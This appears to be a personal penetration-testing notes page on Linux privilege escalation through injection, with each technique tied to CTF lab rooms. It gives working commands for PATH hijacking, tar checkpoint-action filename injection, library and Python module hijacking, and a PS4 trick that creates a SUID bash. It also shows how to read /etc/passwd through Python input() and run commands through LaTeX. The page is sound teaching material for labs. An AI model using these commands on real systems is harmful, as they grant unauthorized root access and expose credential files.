# Injection

<div class="row row-cols-lg-2"><div>

If there is some code that can is executed as another user, for instance, a [scheduled task](../topics/tasks.md) or a [program with the SUID bit](../topics/perms.md#suidguid-bit), you may be able to modify the code behavior using injection.

➡️ You may need/want to create a [root bash](rootbash.md).
</div><div>

There are basic scenarios in which you can directly exploit the executable, but in other scenarios, you may have to exploit the environment itself. In short, it means you may:

* 🌸 edit the environment variables
* 🌿 edit the files used by the program
* 🎭 create a file named after the parameters of the command. For instance, if the code uses a glob-pattern, the pattern will be replaced with the matching files. So, you may inject parameters.
* 🐦 use a flaw in the script language
* ...
</div></div>

<hr class="sep-both">

## Path Environment variable 🌸

[![linprivesc](../../../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
[![linuxprivesc](../../../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
[![commonlinuxprivesc](../../../../_badges/thmp/commonlinuxprivesc.svg)](https://tryhackme.com/room/commonlinuxprivesc)
[![linuxprivilegeescalation](../../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![mustacchio](../../../../_badges/thm-p/mustacchio.svg)](https://tryhackme.com/room/mustacchio)
[![bash_system_1](../../../../_badges/rootme/app_script/bash_system_1.svg)](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-1)
[![bash_system_2](../../../../_badges/rootme/app_script/bash_system_2.svg)](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-2)

<div class="row row-cols-lg-2"><div>

If you can run a script, you may try to see if the script uses your PATH to work. The easiest way to test that is to empty your PATH.

```shell!
$ bash -c 'export PATH=; <execute the script>'
"xxx" command not found ====> OK!
```

You can then try to replace the command binary by a [rootbash](rootbash.md). 

```
$ ls /tmp/rootbash # assuming you created your rootbash
$ ln -s /tmp/rootbash # replace the command "xxx"
$ bash -c 'export PATH=/tmp:$PATH; <execute the script>'
<your bash is called>
```

⚠️ If you are not able to edit the PATH, try to see if you can write files in a folder in the PATH that is before the original folder.
</div><div>

Unfortunately, this doesn't work when the command is invoked with some options, such as `tail -f /var/log/nginx/access.log`.

The trick is to create a script that launches our command. Refer to [Root Bash Script](rootbash.md).

```shell!
$ ln -s /tmp/root.sh /tmp/xxx # your command
$ bash -c 'export PATH=/tmp:$PATH; <execute the script>'
<your bash is called>
```
</div></div>

<hr class="sep-both">

## Parameters injection  🎭

[![linuxprivilegeescalation](../../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![linuxstrengthtraining](../../../../_badges/thm/linuxstrengthtraining.svg)](https://tryhackme.com/room/linuxstrengthtraining)
[![ultra_upload](../../../../_badges/rootme/realist/ultra_upload.svg)](https://www.root-me.org/en/Challenges/Cracking/Godot-Mono)

<div class="row row-cols-lg-2"><div>

We can inject arguments when [glob-patterns](/operating-systems/linux/_knowledge/index.md#glob-patterns) are replaced, e.g., by creating file named after the command arguments.

To execute any command manipulating a filename starting with `-`, you need to use `--` such as `rm -- -la` to remove the file `-la`.

For instance, to inject `-la` into `ls *`:

```shell!
$ touch -- -la
$ ls
-la
$ ls * # * was replaced by -la
total 8
drwxr-xr-x 2 xxx xxx 4096 Apr 29 18:50 .
drwxr-xr-x 9 xxx xxx 4096 Apr 29 18:50 ..
-rw-r--r-- 1 xxx xxx    0 Apr 29 18:50 -la
```
</div><div>

While the `--` trick is handy, it may not always work. You can alternatively use the relative path:

```shell!
$ touch './--checkpoint=1'
$ touch './--checkpoint-action=exec="id > id.txt"'
$ touch './--checkpoint-action=exec=id > id.txt'
$ touch './--checkpoint-action=exec=bash script.sh'
```

If you can read files only in a specific folder or having a specific name, you can try using symbolic links:

```ps
$ ln -s /path/to/juicy/file /tmp/script/res/file
```
</div></div>

<hr class="sep-both">

## Library Hijacking

[![linuxprivilegeescalation](../../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![shared_objects_hijacking](../../../../_badges/rootme/app_script/shared_objects_hijacking.svg)](https://www.root-me.org/en/Challenges/App-Script/Shared-Objects-hijacking)

<div class="row row-cols-lg-2"><div>

Shared Object Hijacking or Linker Hijacking is a technique in which we load a malicious `.so` file when executing a potentially misconfigured binary such as `ls` in a potentially misconfigured environment.

A environment is misconfigured when we have write access to a folder defined in `/etc/ld.so.conf`. Such folders are checked in order when looking for a `.so`. It includes standard folders such as `/lib` or `/usr/lib` and may include non-standard writable paths.

If we find a suspicious binary, we can examine it:

```ps
$ ldd <binary>
$ readelf -d <binary>
```

If the binary has the `RUNPATH` folder set and it points to a file/folder we can write to, then we can load our `.so`.
</div><div>

To write a static binary (`.so`), [refer to rootbash#static binary](../utils/rootbash.md#root-bash-static-library) section.

Misconfigured Python installations may also be vulnerable if we are able to write python scripts in the module path.

```shell!
$ python3 -c 'import sys; print("\n".join(sys.path))'
$ touch xxx.py ; PYTHONPATH=`pwd` python -c 'import xxx'
```

Check every imported package using `pip3 show <package>`. If the package is imported from a location that is below a folder in which you can write to, then you can inject your own code.
</div></div>

<hr class="sep-both">

## Bash scripts failures 🐦

<div class="row row-cols-lg-2"><div>

**Bash versions <4.2-048**: it is possible to create functions named after a path, which allows us to execute a command instead. If the path is accessed by a script, then using `-p`, we can create a bash while inheriting the permissions of its creator.

```bash!
function /some/path { /bin/bash -p; }
export -f /some/path
```
</div><div>

**Bash <4.4**: if debug is enabled, we can inject code in the environment variable PS4 used by bash. If the script has the SUID bit, then using this, we could create a bash with the SUID bit too.

```shell!
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./script
```
</div></div>

<hr class="sep-both">

## Special scenarios 📚

<div class="row row-cols-lg-2"><div>

As a reminder, if you can execute commands, then refer to [command injection](/cybersecurity/red-team/s3.exploitation/vulns/injection/command.md) for additional related content. Refer also to: [format strings](/cybersecurity/red-team/s3.exploitation/vulns/memory/format_strings.md).

<br>

#### Python input() function

[![python_input](../../../../_badges/rootme/app_script/python_input.svg)](https://www.root-me.org/en/Challenges/App-Script/Python-input)

This command is used to prompt the user for input. The problem is that we can write python code <small>(e.g., 5+5)</small>.

```py
open('/tmp/passwd_dump', 'w').write(open('/etc/passwd', 'r').read())
```

<br>

#### Latex directives

[![latex_input](../../../../_badges/rootme/app_script/latex_input.svg)](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input)
[![latex_command_execution](../../../../_badges/rootme/app_script/latex_command_execution.svg)](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)

If we can compile LaTeX, we may be able to

* Execute commands (`\immediate\write18{xxx > buffer}`, `\verbatiminput{buffer}` or using `xxx 1>&2`).
* Read non-LaTeX files using `\input{path_to_file}` or using `\usepackage{verbatim} \verbatiminput{myfile.txt}` (comments)
</div><div>

#### Bash Script Arguments

[![bash_unquoted](../../../../_badges/rootme/app_script/bash_unquoted.svg)](https://www.root-me.org/en/Challenges/App-Script/Bash-unquoted-expression-injection)

If the script uses the argument without quoting them nor validating them, we may be able to inject parameters.

```
$ cat xxx.sh
ls $1
$ ./xxx.sh "-la ."
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [axcheron format strings](https://axcheron.github.io/exploit-101-format-strings/)
</div><div>
</div></div>